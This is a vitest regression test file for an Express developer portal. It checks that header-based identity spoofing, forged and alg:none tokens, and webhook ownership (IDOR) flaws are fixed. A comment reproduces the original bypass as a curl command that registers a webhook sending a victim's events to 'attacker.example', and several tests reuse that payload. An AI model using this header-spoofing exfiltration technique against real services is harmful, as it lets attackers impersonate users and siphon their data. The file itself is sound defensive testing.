import { describe, it, expect } from 'vitest';
import request from 'supertest';
import express from 'express';
import devportalRouter from '../routes/devportal.js';
import { stripIdentityHeaders } from '../middleware/stripIdentityHeaders.js';
import { errorHandler } from '../middleware/errorHandler.js';
import {
  signTestToken,
  forgedUnsignedToken,
  algNoneToken,
  expiredToken,
} from './fixtures/tokens.js';

/**
 * The developer portal's trust boundary.
 *
 * Every user-scoped route here read its identity from a request header:
 *
 *     const userId = (req.headers['x-user-id'] as string) ?? 'anonymous';
 *
 * and none of them had `requireAuth`. Reproduced against the running service
 * before this change, with no Authorization header at all:
 *
 *     curl -X POST localhost:3001/api/v1/developer/webhooks \
 *          -H 'x-user-id: victim-user-0001' \
 *          -d '{"url":"https://attacker.example/steal","events":["job.completed"]}'
 *     → 201 Created  {"userId":"victim-user-0001", ...}
 *
 * The app below mirrors the real service: `stripIdentityHeaders` runs before
 * the router, exactly as it does in src/index.ts.
 */

const VICTIM = '22222222-2222-4222-8222-222222222222';
const ATTACKER = '33333333-3333-4333-8333-333333333333';

const app = express();
app.use(express.json());
app.use(stripIdentityHeaders);
app.use('/api/v1', devportalRouter);
app.use(errorHandler);

function auth(sub: string) {
  return { Authorization: `Bearer ${signTestToken({ sub })}` };
}

describe('devportal — the header bypass is closed', () => {
  it('rejects a webhook creation carrying only x-user-id and no token', async () => {
    const res = await request(app)
      .post('/api/v1/developer/webhooks')
      .set('x-user-id', VICTIM)
      .send({ url: 'https://attacker.example/steal', events: ['job.completed'] });

    expect(res.status).toBe(401);
  });

  it('rejects listing webhooks with only x-user-id', async () => {
    const res = await request(app).get('/api/v1/developer/webhooks').set('x-user-id', VICTIM);
    expect(res.status).toBe(401);
  });

  it('rejects usage, sandbox and rate-limit with only x-user-id', async () => {
    const usage = await request(app).get('/api/v1/developer/usage').set('x-user-id', VICTIM);
    const sandbox = await request(app).post('/api/v1/developer/sandbox').set('x-user-id', VICTIM);
    const rate = await request(app).get('/api/v1/developer/rate-limit').set('x-user-id', VICTIM);

    expect(usage.status).toBe(401);
    expect(sandbox.status).toBe(401);
    expect(rate.status).toBe(401);
  });

  it('rejects every user-scoped route with no credentials whatsoever', async () => {
    // `?? 'anonymous'` meant a request with no header at all still resolved to
    // a shared identity, so one caller could read another's sandbox keys.
    for (const [method, path] of [
      ['get', '/api/v1/developer/usage'],
      ['get', '/api/v1/developer/webhooks'],
      ['post', '/api/v1/developer/sandbox'],
      ['get', '/api/v1/developer/rate-limit'],
    ] as const) {
      const res = await request(app)[method](path);
      expect(res.status, `${method.toUpperCase()} ${path}`).toBe(401);
    }
  });
});

describe('devportal — forged tokens', () => {
  it('rejects the forged unsigned token', async () => {
    const res = await request(app)
      .get('/api/v1/developer/webhooks')
      .set('Authorization', `Bearer ${forgedUnsignedToken(VICTIM)}`);

    expect(res.status).toBe(401);
  });

  it('rejects an alg: none token', async () => {
    const res = await request(app)
      .get('/api/v1/developer/webhooks')
      .set('Authorization', `Bearer ${algNoneToken(VICTIM)}`);

    expect(res.status).toBe(401);
  });

  it('rejects an expired token', async () => {
    const res = await request(app)
      .get('/api/v1/developer/webhooks')
      .set('Authorization', `Bearer ${expiredToken(VICTIM)}`);

    expect(res.status).toBe(401);
  });
});

describe('devportal — identity comes from the token, not the header', () => {
  it('ignores x-user-id when a valid token names someone else', async () => {
    // The attacker authenticates as themselves but asserts the victim's id.
    // The webhook must be created under the token's subject.
    const created = await request(app)
      .post('/api/v1/developer/webhooks')
      .set(auth(ATTACKER))
      .set('x-user-id', VICTIM)
      .send({ url: 'https://attacker.example/hook', events: ['job.completed'] });

    expect(created.status).toBe(201);
    expect(created.body.data.userId).toBe(ATTACKER);
    expect(created.body.data.userId).not.toBe(VICTIM);
  });

  it("the victim's list is unaffected by the attacker's header", async () => {
    const victimList = await request(app).get('/api/v1/developer/webhooks').set(auth(VICTIM));

    expect(victimList.status).toBe(200);
    for (const hook of victimList.body.data) {
      expect(hook.userId).toBe(VICTIM);
      expect(hook.url).not.toContain('attacker.example');
    }
  });
});

describe('devportal — webhook ownership (IDOR)', () => {
  it("will not test another user's webhook", async () => {
    const created = await request(app)
      .post('/api/v1/developer/webhooks')
      .set(auth(VICTIM))
      .send({ url: 'https://victim.example/hook', events: ['job.completed'] });
    const webhookId = created.body.data.id;

    // Authenticated, but not the owner. Before the ownership check, this fired
    // a real delivery on someone else's webhook.
    const res = await request(app)
      .post(`/api/v1/developer/webhooks/${webhookId}/test`)
      .set(auth(ATTACKER));

    expect(res.status).toBe(404);
  });

  it("will not read another user's webhook delivery logs", async () => {
    const created = await request(app)
      .post('/api/v1/developer/webhooks')
      .set(auth(VICTIM))
      .send({ url: 'https://victim.example/hook2', events: ['job.completed'] });
    const webhookId = created.body.data.id;

    await request(app).post(`/api/v1/developer/webhooks/${webhookId}/test`).set(auth(VICTIM));

    const owner = await request(app)
      .get(`/api/v1/developer/webhooks/${webhookId}/logs`)
      .set(auth(VICTIM));
    const other = await request(app)
      .get(`/api/v1/developer/webhooks/${webhookId}/logs`)
      .set(auth(ATTACKER));

    expect(owner.body.data.length).toBeGreaterThan(0);
    expect(other.body.data).toEqual([]);
  });

  it("will not delete another user's webhook", async () => {
    const created = await request(app)
      .post('/api/v1/developer/webhooks')
      .set(auth(VICTIM))
      .send({ url: 'https://victim.example/hook3', events: ['job.completed'] });
    const webhookId = created.body.data.id;

    const res = await request(app)
      .delete(`/api/v1/developer/webhooks/${webhookId}`)
      .set(auth(ATTACKER));

    expect(res.status).toBe(404);
  });
});

describe('devportal — the public route stays public', () => {
  it('serves the changelog without a token', async () => {
    const res = await request(app).get('/api/v1/developer/changelog');
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.data)).toBe(true);
  });
});
